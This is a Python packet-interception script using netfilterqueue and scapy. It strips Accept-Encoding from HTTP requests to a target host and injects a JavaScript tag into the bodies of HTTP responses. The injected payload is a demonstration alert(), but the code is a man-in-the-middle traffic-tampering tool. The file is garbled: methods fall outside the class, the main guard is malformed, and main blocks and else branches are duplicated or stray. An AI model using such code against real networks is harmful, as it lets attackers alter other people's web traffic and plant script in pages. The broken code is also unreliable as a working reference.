import socket

import threading

import netfilterqueue

from scapy.all import *

import re

import logging

from datetime import datetime

logging.basicConfig(level=logging.INFO,

                    format="%(asctime)s %(levelname)s: %(message)s",

                    datefmt="%Y-%m-%d %H:%M:%S")

class Interceptor:

    def __init__(self, address, port, iface=None):

        self.address = address

        self.port = int(port)

        self.iface = iface

        self.queue = netfilterqueue.NetfilterQueue()

        self.queue.bind(0, self.process_packet)

    def start(self):

        logging.info(f"Interceptor started for {self.address}:{self.port}")

        if self.iface:

            sniff(filter=f"tcp and host {self.address} and port {self.port}",

                  prn=self.process_packet,

                  iface=self.iface,

                  store=False)

        else:

            self.queue.run()

    def stop(self):

        logging.info("Stopping interceptor...")

        self.queue.unbind()

    def process_packet(self, packet):

        spacket = IP(packet.get_payload())

        if spacket[TCP].dport == self.port and spacket[IP].dst == self.address:

            # Packet is an HTTP request to the target host

            logging.info(f"Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")

            self.process_request(packet, spacket)

        elif spacket[TCP].sport == self.port and spacket[IP].src == self.address:

            # Packet is an HTTP response from the target host

            logging.info(f"Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")

            self.process_response(packet, spacket)

        else:

            # Packet is not relevant to the target host or port, just
continue processing it

packet.accept()
def process_request(self, packet, spacket):

    try:

        load = spacket[Raw].load.decode()

    except Exception as e:

        packet.accept()

        return

    # Modify the request as needed

    modified_load = self.modify_request(load)

    if modified_load != load:

        spacket[Raw].load = modified_load

        spacket[IP].len = None

        spacket[IP].chksum = None

        spacket[TCP].chksum = None

        packet.set_payload(bytes(spacket))

def process_response(self, packet, spacket):

    try:

        load = spacket[Raw].load.decode()

    except Exception as e:

        packet.accept()

        return

    # Modify the response as needed

    modified_load = self.modify_response(load)

    if modified_load != load:

        spacket[Raw].load = modified_load.encode()

        spacket[IP].len = None

        spacket[IP].chksum = None

        spacket[TCP].chksum = None

        packet.set_payload(bytes(spacket))

def modify_request(self, load):

    # Modify the request here

    return load

def modify_response(self, load):

    # Modify the response here

    return load
if name == "main":

# Example usage

address = "example.com"

port = 80

interceptor = Interceptor(address, port)

interceptor.start()
else:

# Pass packet through without modification

packet.accept()
def process_request(self, packet, spacket):

    # Extract the HTTP request body

    try:

        load = spacket[Raw].load.decode()

    except Exception as e:

        packet.accept()

        return

    # Remove the Accept-Encoding header from the request

    new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)

    # Update the packet payload with the modified request

    spacket[Raw].load = new_load.encode()

    # Reset the packet checksums and lengths to ensure they are recomputed

    spacket[IP].len = None

    spacket[IP].chksum = None

    spacket[TCP].chksum = None

    # Set the modified packet payload

    packet.set_payload(bytes(spacket))

def process_response(self, packet, spacket):

    # Extract the HTTP response body

    try:

        load = spacket[Raw].load.decode()

    except Exception as e:

        packet.accept()

        return

    # Inject a script into the response body

    added_text = "<script>alert('Javascript Injected successfully!');</script>"

    added_text_length = len(added_text)

    load = load.replace("</body>", added_text + "</body>")

    # Update the Content-Length header with the new length of the response body

    if "Content-Length" in load:

        content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))

        new_content_length = content_length + added_text_length

        load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)

        if added_text in load:

            logging.info(f"Successfully injected code to {spacket[IP].dst}")

    # Update the packet payload with the modified response

    spacket[Raw].load = load.encode()

    # Reset the packet checksums and lengths to ensure they are recomputed

    spacket[IP].len = None

    spacket[IP].chksum = None

    spacket[TCP].chksum = None

    # Set the modified packet payload

    packet.set_payload(bytes(spacket))

if name == "main":

# Define the target address and port to intercept traffic to

target_address = "example.com"

target_port = 80
# Initialize the interceptor

interceptor = Interceptor(target_address, target_port)

# Start the interceptor

interceptor.start()

# Initialize the interceptor

interceptor = Interceptor(target_address, target_port)

# Start the interceptor

interceptor.start()

Initialize the interceptor

interceptor = Interceptor(target_address, target_port)

Start the interceptor

try:

# Start the interceptor in a separate thread so we can stop it with the keyboard interrupt signal (CTRL+C)

interceptor_thread = threading.Thread(target=interceptor.start)

interceptor_thread.start()
while True:

    # Keep the main thread running to be able to stop the interceptor with the keyboard interrupt signal (CTRL+C)

    time.sleep(1)

while True:

    # Keep the main thread running to be able to stop the interceptor with the keyboard interrupt signal (CTRL+C)

    time.sleep(1)

except KeyboardInterrupt:

# Stop the interceptor when the keyboard interrupt signal is received (CTRL+C)

interceptor.stop()

interceptor_thread.join()

logging.info("Interceptor stopped.")
# Initialize the interceptor

interceptor = Interceptor(target_address, target_port)

# Start the interceptor in a separate thread

interceptor_thread = threading.Thread(target=interceptor.start)

interceptor_thread.daemon = True

interceptor_thread.start()

# Wait for the user to stop the interceptor

try:

    logging.info("Interceptor is running. Press CTRL+C to stop.")

    while True:

        time.sleep(1)

except KeyboardInterrupt:

    # Stop the interceptor when the keyboard interrupt signal is received (CTRL+C)

    interceptor.stop()

    interceptor_thread.join()

    logging.info("Interceptor stopped.")


